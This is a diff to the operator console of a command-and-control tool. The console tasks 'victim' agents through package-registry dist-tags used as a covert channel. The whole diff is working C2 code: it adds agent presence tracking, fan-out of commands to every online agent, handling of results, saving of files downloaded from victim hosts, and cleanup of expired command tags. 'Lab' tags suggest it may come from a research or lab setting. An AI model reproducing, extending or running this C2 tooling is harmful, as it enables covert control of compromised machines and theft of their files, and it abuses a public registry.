@@ -7,7 +7,7 @@
 //
 // Commands:
 //   agents                      list agents seen, with last-seen info
-//   task <agentId|all> <op> [args...]   publish a command tag
+//   task <agentId|all> <op> [args...]   task one online agent or fan out to all
 //                         (op allowlist: src/common/ops.js)
 //   history [n]                 show the last n requests/responses (default 20)
 //   poll                        fetch results or show locally pending direct tasks
@@ -21,22 +21,33 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { styleText } from 'node:util';
 import { pathToFileURL } from 'node:url';
-import { loadConfig, configArgFromArgv } from '../common/config.js';
+import { channelTimings, loadConfig, configArgFromArgv } from '../common/config.js';
 import { createLogger } from '../common/logger.js';
 import {
   PINNED_VERSION,
   MAX_TAG_LEN,
   decodeAnnounceTag,
+  decodeCommandTag,
   decodeResultTag,
   encodeCommandTag,
   isAnnounceTag,
+  isCommandTag,
   isLabTag,
   isResultTag,
   reassembleResult,
 } from '../common/protocol.js';
 import { OP_DEFS, getOpDef } from '../common/ops.js';
 import { RegistryClient } from '../common/registry.js';
-import { saveState } from '../victim/agent.js';
+import { isCommandExpired, saveState } from '../victim/agent.js';
+import {
+  agentPresenceStatus,
+  assertDirectTargetOnline,
+  invalidateAgentPresence,
+  isAgentOnline,
+  loadAttackerState,
+  mergeAgentInfo,
+  observeHeartbeatSet,
+} from './presence.js';
 
 const tty = process.stdout.isTTY;
 const c = (color, s) => (tty ? styleText(color, s) : s);
@@ -53,41 +64,12 @@ const dim = (s) => c('dim', s);
 
 const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
 const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history
+const REGISTRY_TEXT_MAX = 4_000;
+const ANSI_CSI_RE = /\u001b\[[0-?]*[ -/]*[@-~]/g;
+const TERMINAL_CONTROL_RE = /[\u0000-\u001f\u007f-\u009f]/g;
 
 function ts() {
   return new Date().toTimeString().slice(0, 8);
-}
-
-// ---------------------------------------------------------------------------
-// attacker state (separate shape from victim state, same persistence helpers)
-// ---------------------------------------------------------------------------
-
-function defaultAttackerState() {
-  return {
-    nextSeq: {}, // per-target (agentId or 'all') next sequence number
-    sent: 0,
-    received: 0,
-    perAgent: {}, // agentId -> results received
-    seenResults: [], // "<agentId>:<seq>" strings
-    agents: [], // agent ids observed
-    agentInfo: {}, // agentId -> { ts, host, cwd, lastSeen }
-    history: [], // [{ dir: 'out'|'in', ts, ... }]
-  };
-}
-
-function loadAttackerState(path) {
-  const s = defaultAttackerState();
-  try {
-    const raw = JSON.parse(fs.readFileSync(path, 'utf8'));
-    if (raw && typeof raw === 'object') {
-      for (const k of Object.keys(s)) {
-        if (raw[k] !== undefined) s[k] = raw[k];
-      }
-    }
-  } catch {
-    // missing or corrupt state file -> start fresh
-  }
-  return s;
 }
 
 function pushHistory(state, entry) {
@@ -98,7 +80,7 @@ function pushHistory(state, entry) {
 }
 
 /** Direct requests without a matching locally recorded response. */
-export function pendingDirectTasks(history) {
+export function pendingDirectTasks(history, { now = Date.now(), ttlMs = Infinity } = {}) {
   const completed = new Set(
     history
       .filter((entry) => entry.dir === 'in')
@@ -108,8 +90,49 @@ export function pendingDirectTasks(history) {
     (entry) =>
       entry.dir === 'out' &&
       entry.target !== 'all' &&
+      now - entry.ts < ttlMs &&
       !completed.has(`${entry.target}:${entry.seq}:${entry.op}`),
   );
+}
+
+export function wasCommandSentLocally(history, tag) {
+  return history.some((entry) => entry.dir === 'out' && entry.tag === tag);
+}
+
+/** Render registry-controlled text without terminal escapes or unbounded output. */
+export function sanitizeRegistryText(value, maxLength = REGISTRY_TEXT_MAX) {
+  const text = typeof value === 'string' ? value : String(value ?? '');
+  return text
+    .replace(ANSI_CSI_RE, '')
+    .replace(TERMINAL_CONTROL_RE, (character) => {
+      if (character === '\n') return '\\n';
+      if (character === '\t') return '\\t';
+      return '';
+    })
+    .slice(0, maxLength);
+}
+
+/** Coalesce concurrent refresh callers onto the same in-flight promise. */
+export function createSingleFlight(fn) {
+  let inFlight = null;
+  return (...args) => {
+    if (inFlight) return inFlight;
+    let result;
+    try {
+      result = fn(...args);
+    } catch (err) {
+      result = Promise.reject(err);
+    }
+    const shared = Promise.resolve(result).finally(() => {
+      if (inFlight === shared) inFlight = null;
+    });
+    inFlight = shared;
+    return shared;
+  };
+}
+
+export function formatLiveNotification(line, clearPrompt) {
+  return clearPrompt ? `\r\x1b[2K${line}` : line;
 }
 
 // ---------------------------------------------------------------------------
@@ -183,7 +206,13 @@ function sanitizeFilename(name) {
 function saveDownload(agentId, r) {
   const dir = path.resolve('downloads');
   fs.mkdirSync(dir, { recursive: true });
+  if (!Number.isSafeInteger(r.seq) || r.seq < 1) {
+    throw new Error('missing or invalid result sequence');
+  }
   const out = path.join(dir, `${agentId}-seq${r.seq}-${sanitizeFilename(r.file.name)}`);
+  if (path.dirname(out) !== dir) {
+    throw new Error('resolved download path escapes downloads/');
+  }
   if (!Number.isSafeInteger(r.file.size) || r.file.size < 0) {
     throw new Error('missing or invalid file size');
   }
@@ -205,8 +234,9 @@ function formatHistoryEntry(e) {
     return `[${at}] ${c('blue', '->')} ${e.target} #${e.seq} ${e.op}${argStr}`;
   }
   const status = e.ok ? c('green', 'ok') : c('red', 'FAIL');
-  const body = e.ok ? (e.output ?? '') : (e.error ?? '');
-  return `[${at}] ${c('magenta', '<-')} ${e.agentId} #${e.seq} ${e.op} ${status}: ${body}`;
+  const body = sanitizeRegistryText(e.ok ? e.output : e.error, HISTORY_OUTPUT_MAX);
+  const op = sanitizeRegistryText(e.op ?? '?', 64);
+  return `[${at}] ${c('magenta', '<-')} ${e.agentId} #${e.seq} ${op} ${status}: ${body}`;
 }
 
 async function main() {
@@ -219,6 +249,7 @@ async function main() {
   const statePath = cfg.stateFile || 'attacker-state.json';
   const state = loadAttackerState(statePath);
   const save = () => saveState(statePath, state);
+  const timings = channelTimings(cfg.pollIntervalSec);
 
   const client = new RegistryClient({
     registryUrl: cfg.registryUrl,
@@ -245,44 +276,68 @@ async function main() {
 
   /** Print a live notification without eating the line the user is typing. */
   function notify(line, redraw = true) {
-    console.log(line);
-    if (redraw) rl.prompt(true);
+    console.log(formatLiveNotification(line, redraw && tty));
+    if (redraw && !rlClosed) rl.prompt(true);
   }
 
   // --- shared helpers -------------------------------------------------------
 
-  function noteAgent(agentId, info = {}, redraw = true) {
-    const isNew = !state.agents.includes(agentId);
-    if (isNew) state.agents.push(agentId);
-    const prev = state.agentInfo[agentId] ?? {};
-    state.agentInfo[agentId] = {
-      ...prev,
-      ...info,
-      lastSeen: Date.now(),
-    };
-    if (isNew) {
-      const { host, cwd } = state.agentInfo[agentId];
+  function noteAgent(agentId, info = {}) {
+    if (!state.agents.includes(agentId)) state.agents.push(agentId);
+    state.agentInfo[agentId] = mergeAgentInfo(state.agentInfo[agentId], info);
+  }
+
+  function observeAgentHeartbeats(agentId, entries, observedAt, redraw) {
+    const previous = state.agentInfo[agentId] ?? {};
+    const wasOnline = isAgentOnline(previous, observedAt, timings.offlineMs);
+    const known = new Set(Array.isArray(previous.heartbeatTags) ? previous.heartbeatTags : []);
+    const unseenEntries = entries.filter((entry) => !known.has(entry.tag));
+    const metadataEntries = Array.isArray(previous.heartbeatTags) && unseenEntries.length > 0
+      ? unseenEntries
+      : entries;
+    const selected = metadataEntries.reduce((latest, entry) => {
+      const latestTs = Number(latest?.payload?.ts);
+      const entryTs = Number(entry.payload?.ts);
+      if (!latest || (Number.isFinite(entryTs) && (!Number.isFinite(latestTs) || entryTs > latestTs))) {
+        return entry;
+      }
+      return latest;
+    }, null);
+    const next = observeHeartbeatSet(
+      previous,
+      entries.map((entry) => entry.tag),
+      selected?.payload ?? {},
+      observedAt,
+    );
+
+    if (!state.agents.includes(agentId)) state.agents.push(agentId);
+    state.agentInfo[agentId] = next;
+    if (!wasOnline && isAgentOnline(next, observedAt, timings.offlineMs)) {
+      const { host, cwd } = next;
       const detail = [host && `host=${host}`, cwd && `cwd=${cwd}`].filter(Boolean).join(' ');
       notify(`[${ts()}] ${c('green', '[+] agent joined:')} ${c('bold', agentId)}${detail ? ` (${detail})` : ''}`, redraw);
     }
   }
 
   function printResult(agentId, r, redraw = true) {
-    const head = `[${ts()}] ${c('magenta', agentId)} #${r.seq} ${r.op ?? '?'}`;
+    const op = sanitizeRegistryText(r.op ?? '?', 64);
+    const output = sanitizeRegistryText(r.output);
+    const error = sanitizeRegistryText(r.error);
+    const head = `[${ts()}] ${c('magenta', agentId)} #${r.seq} ${op}`;
     if (!r.ok) {
-      notify(`${head} ${c('red', 'FAILED')}: ${r.error}`, redraw);
+      notify(`${head} ${c('red', 'FAILED')}: ${error}`, redraw);
       return;
     }
     if (r.file && typeof r.file.dataB64 === 'string') {
       try {
         const out = saveDownload(agentId, r);
-        notify(`${head} ${c('green', 'done')}: ${r.output} -> saved to ${c('bold', out)}`, redraw);
+        notify(`${head} ${c('green', 'done')}: ${output} -> saved to ${c('bold', out)}`, redraw);
       } catch (err) {
         notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`, redraw);
       }
       return;
     }
-    notify(`${head} ${c('green', 'done')}: ${r.output}`, redraw);
+    notify(`${head} ${c('green', 'done')}: ${output}`, redraw);
   }
 
   function recordResult(agentId, r) {
@@ -291,46 +346,58 @@ async function main() {
       ts: Date.now(),
       agentId,
       seq: r.seq,
-      op: r.op ?? '?',
+      op: sanitizeRegistryText(r.op ?? '?', 64),
       ok: r.ok,
-      output:
-        typeof r.output === 'string' && r.output.length > HISTORY_OUTPUT_MAX
-          ? `${r.output.slice(0, HISTORY_OUTPUT_MAX)}...`
-          : r.output,
-      error: r.error,
+      output: sanitizeRegistryText(r.output, HISTORY_OUTPUT_MAX),
+      error: sanitizeRegistryText(r.error, HISTORY_OUTPUT_MAX),
     });
   }
 
-  let pollInFlight = false;
+  let registryFresh = false;
+  let presenceEpoch = 0;
+  let cleaning = false;
 
   function printPendingTasks() {
-    for (const task of pendingDirectTasks(state.history).slice(-5)) {
+    const pending = pendingDirectTasks(state.history, {
+      now: Date.now(),
+      ttlMs: timings.taskTtlMs,
+    });
+    for (const task of pending.slice(-5)) {
       const ageSec = Math.max(0, Math.floor((Date.now() - task.ts) / 1000));
       console.log(c('yellow', `pending: ${task.target} #${task.seq} ${task.op} (${ageSec}s)`));
     }
   }
 
-  async function pollOnce({ quiet = false, redraw = false } = {}) {
-    if (pollInFlight) {
-      if (!quiet) {
-        console.log('no new results');
-        printPendingTasks();
-      }
-      return 0;
-    }
-    pollInFlight = true;
+  const refreshOnce = createSingleFlight(async ({ redraw = false } = {}) => {
+    if (cleaning) throw new Error('registry cleanup is in progress');
+    const refreshEpoch = presenceEpoch;
     try {
       const tags = await client.getDistTags();
+      if (refreshEpoch !== presenceEpoch || cleaning) {
+        return { fresh: 0, incomplete: [] };
+      }
+      const observedAt = Date.now();
       const groups = new Map(); // "<agentId>:<seq>" -> parts[]
+      const announcements = new Map(); // agentId -> [{ tag, payload }]
+      const expiredCommandTags = [];
       for (const name of Object.keys(tags)) {
+        if (isCommandTag(name)) {
+          try {
+            const cmd = decodeCommandTag(name);
+            const sentLocally = wasCommandSentLocally(state.history, name);
+            if (sentLocally && isCommandExpired(cmd.payload, Date.now(), timings.taskTtlMs)) {
+              expiredCommandTags.push(name);
+            }
+          } catch (err) {
+            logger.warn(`skipping malformed command tag "${name}": ${err.message}`);
+          }
+          continue;
+        }
         if (isAnnounceTag(name)) {
           try {
             const ann = decodeAnnounceTag(name);
-            noteAgent(ann.agentId, {
-              ts: ann.payload.ts,
-              host: ann.payload.host,
-              cwd: ann.payload.cwd,
-            }, redraw);
+            if (!announcements.has(ann.agentId)) announcements.set(ann.agentId, []);
+            announcements.get(ann.agentId).push({ tag: name, payload: ann.payload });
           } catch (err) {
             logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
           }
@@ -347,19 +414,30 @@ async function main() {
         const key = `${part.agentId}:${part.seq}`;
         if (!groups.has(key)) groups.set(key, []);
         groups.get(key).push(part);
-        noteAgent(part.agentId, {}, redraw);
       }
+      for (const [agentId, entries] of announcements) {
+        observeAgentHeartbeats(agentId, entries, observedAt, redraw);
+      }
+      for (const agentId of state.agents) {
+        const info = state.agentInfo[agentId] ?? {};
+        if (!announcements.has(agentId) && !Number(info.lastSeen) && !Number(info.baselineAt)) {
+          state.agentInfo[agentId] = invalidateAgentPresence(info, observedAt);
+        }
+      }
+
       let fresh = 0;
+      const incomplete = [];
       for (const [key, parts] of groups) {
         if (state.seenResults.includes(key)) continue;
         const total = parts[0].total;
         if (new Set(parts.map((p) => p.chunk)).size !== total) {
-          if (!quiet) notify(c('yellow', `${key}: waiting for chunks (${new Set(parts.map((p) => p.chunk)).size}/${total})`), redraw);
+          incomplete.push(`${key}: waiting for chunks (${new Set(parts.map((p) => p.chunk)).size}/${total})`);
           continue;
         }
         try {
           const result = reassembleResult(parts);
           const a = parts[0].agentId;
+          noteAgent(a);
           printResult(a, result, redraw);
           recordResult(a, result);
           state.seenResults.push(key);
@@ -370,15 +448,44 @@ async function main() {
           logger.warn(`failed to reassemble ${key}: ${err.message}`);
         }
       }
-      save();
-      if (!quiet) {
-        console.log(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
-        if (fresh === 0) printPendingTasks();
+      for (const tag of expiredCommandTags) {
+        try {
+          await client.deleteDistTag(tag);
+        } catch (err) {
+          logger.warn(`failed to delete expired command "${tag}": ${err.message}`);
+        }
       }
-      return fresh;
-    } finally {
-      pollInFlight = false;
+      registryFresh = true;
+      save();
+      return { fresh, incomplete };
+    } catch (err) {
+      registryFresh = false;
+      throw err;
     }
+  });
+
+  async function pollOnce({ quiet = false, redraw = false } = {}) {
+    const { fresh, incomplete } = await refreshOnce({ redraw });
+    if (!quiet) {
+      for (const message of incomplete) notify(c('yellow', message), redraw);
+      console.log(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
+      if (fresh === 0) printPendingTasks();
+    }
+    return fresh;
+  }
+
+  async function sendDirectTask(target, op, args) {
+    const seq = (state.nextSeq[target] ?? 0) + 1;
+    const sentAt = Date.now();
+    const payload = { op, args, ts: sentAt, lease: state.agentInfo[target].lease };
+    const tag = encodeCommandTag(target, seq, payload);
+    await client.setDistTag(tag, PINNED_VERSION);
+    state.nextSeq[target] = seq;
+    state.sent++;
+    pushHistory(state, { dir: 'out', ts: sentAt, target, seq, op, args, tag });
+    save();
+    console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (tag ${tag.length}/${MAX_TAG_LEN} chars)`);
+    console.log(c('dim', `  ${tag}`));
   }
 
   // --- help rendering -------------------------------------------------------
@@ -397,7 +504,7 @@ async function main() {
   const commands = {
     help() {
       const commandRows = [
-        ['task <agentId|all> <op> [args]', 'publish a command tag'],
+        ['task <agentId|all> <op> [args]', 'task one online agent or fan out to all'],
         ['agents', 'list agents seen (last-seen, host, cwd)'],
         ['history [n]', 'last n requests/responses (default 20)'],
         ['poll', 'fetch results or show locally pending direct tasks'],
@@ -439,11 +546,17 @@ async function main() {
         for (const a of state.agents) {
           const info = state.agentInfo[a] ?? {};
           const seen = info.lastSeen ? new Date(info.lastSeen).toLocaleString() : '?';
+          const presence = agentPresenceStatus(info, Date.now(), timings.offlineMs, registryFresh);
+          const status = presence === 'online'
+            ? c('green', presence)
+            : presence === 'offline'
+              ? c('red', presence)
+              : c('yellow', presence);
           const detail = [info.host && `host=${info.host}`, info.cwd && `cwd=${info.cwd}`]
             .filter(Boolean)
             .join(' ');
           console.log(
-            `  ${c(['bold', 'green'], a)}  ${dim(`${state.perAgent[a] ?? 0} results, last seen ${seen}`)}`,
+            `  ${c(['bold', 'green'], a)}  ${status}, ${dim(`${state.perAgent[a] ?? 0} results, last heartbeat observed ${seen}`)}`,
           );
           if (detail) console.log(`    ${dim(detail)}`);
         }
@@ -452,18 +565,24 @@ async function main() {
 
     async task(line) {
       const { target, op, args } = parseTaskLine(line);
-      const seq = (state.nextSeq[target] ?? 0) + 1;
-      const payload = { op, args, ts: Date.now() };
-      const tag = encodeCommandTag(target, seq, payload); // throws if payload too big
-      await client.setDistTag(tag, PINNED_VERSION);
-      state.nextSeq[target] = seq;
-      state.sent++;
-      pushHistory(state, { dir: 'out', ts: Date.now(), target, seq, op, args });
-      save();
-      console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (tag ${tag.length}/${MAX_TAG_LEN} chars)`);
-      console.log(c('dim', `  ${tag}`));
-      if (state.agents.length > 0 && target !== 'all' && !state.agents.includes(target)) {
-        console.log(c('yellow', `  note: agent "${target}" has not been seen yet`));
+      try {
+        await pollOnce({ quiet: true });
+      } catch (err) {
+        throw new Error(`cannot verify agent presence: ${err.message}`);
+      }
+
+      if (target === 'all') {
+        const targets = state.agents.filter((agentId) => {
+          const info = state.agentInfo[agentId];
+          return typeof info?.lease === 'string'
+            && agentPresenceStatus(info, Date.now(), timings.offlineMs, registryFresh) === 'online';
+        });
+        if (targets.length === 0) throw new Error('no online agents available; task not sent');
+        for (const agentId of targets) await sendDirectTask(agentId, op, args);
+        console.log(c('dim', `  fan-out complete: ${targets.length} agent(s)`));
+      } else {
+        assertDirectTargetOnline(state, target, Date.now(), timings.offlineMs, registryFresh);
+        await sendDirectTask(target, op, args);
       }
     },
 
@@ -488,23 +607,38 @@ async function main() {
     },
 
     async clean() {
-      const tags = await client.getDistTags();
-      const lab = Object.keys(tags).filter(isLabTag);
-      if (lab.length === 0) {
-        console.log('nothing to clean');
-        return;
-      }
-      let deleted = 0;
-      for (const tag of lab) {
-        try {
-          await client.deleteDistTag(tag);
-          deleted++;
-        } catch (err) {
-          console.log(c('yellow', `failed to delete ${tag}: ${err.message}`));
+      cleaning = true;
+      presenceEpoch++;
+      try {
+        const tags = await client.getDistTags();
+        const lab = Object.keys(tags).filter(isLabTag);
+        if (lab.length === 0) {
+          console.log('nothing to clean');
+          return;
         }
+        let deleted = 0;
+        for (const tag of lab) {
+          try {
+            await client.deleteDistTag(tag);
+            deleted++;
+          } catch (err) {
+            console.log(c('yellow', `failed to delete ${tag}: ${err.message}`));
+          }
+        }
+        const remaining = Object.keys(await client.getDistTags());
+        console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
+      } finally {
+        const invalidatedAt = Date.now();
+        state.agentInfo = Object.fromEntries(
+          Object.entries(state.agentInfo).map(([agentId, info]) => [
+            agentId,
+            invalidateAgentPresence(info, invalidatedAt),
+          ]),
+        );
+        registryFresh = false;
+        cleaning = false;
+        save();
       }
-      const remaining = Object.keys(await client.getDistTags());
-      console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
     },
 
     stats() {
@@ -559,7 +693,7 @@ async function main() {
       console.log(c('red', `error: ${err.message}`));
       logger.error(`command "${cmd}" failed: ${err.message}`);
     }
-    rl.prompt();
+    if (!rlClosed) rl.prompt();
   }
 
   // Serialize command handling so piped input cannot race (e.g. "exit"
@@ -570,8 +704,10 @@ async function main() {
   });
 
   rl.on('close', () => {
+    // Mark closed synchronously: piped input can fire 'close' while queued
+    // async commands are still running, and they must not prompt a dead rl.
+    rlClosed = true;
     queue.then(() => {
-      rlClosed = true;
       clearInterval(timer);
       save();
       logger.close();
